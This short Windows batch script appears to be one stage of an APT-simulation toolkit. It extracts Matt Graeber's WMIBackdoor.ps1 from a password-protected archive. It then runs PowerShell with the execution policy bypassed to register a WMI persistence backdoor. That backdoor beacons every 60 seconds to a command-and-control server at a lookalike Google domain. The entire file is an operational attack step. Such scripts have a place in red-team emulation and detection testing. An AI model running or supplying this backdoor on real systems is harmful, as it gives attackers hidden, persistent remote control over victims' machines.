@ECHO OFF

ECHO ===========================================================================
ECHO WMI Backdoor C2
ECHO.
ECHO Using Matt Graeber's WMIBackdoor to contact a C2 in certain intervals
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o"%APTDIR%" toolset\WMIBackdoor.ps1 > NUL

powershell.exe -Exec ByPasS ". %APTDIR%\WMIBackdoor.ps1;$Trigger2=New-WMIBackdoorTrigger -TimingInterval 60;$Action2=New-WMIBackdoorAction -C2Uri 'http://googleaccountsservices.com' -Backdoor; $Registration2=Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2"
